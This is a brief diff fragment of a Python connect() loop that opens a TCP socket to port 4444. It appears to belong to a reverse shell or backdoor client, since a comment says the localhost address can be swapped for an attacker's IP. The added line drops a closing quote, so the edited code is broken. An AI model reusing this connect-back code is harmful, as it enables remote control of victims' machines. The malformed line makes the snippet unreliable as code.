@@ -28,7 +28,7 @@ def connect():
     while 1:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #tcp socket
-            s.connect(("", 4444)) # 127.0.0.1 is localhost or current connected network
+            s.connect(("127.0.0.1,4444))
              # 127.0.0.1 can be replaced by haxxors ip
             break
         except socket.error:
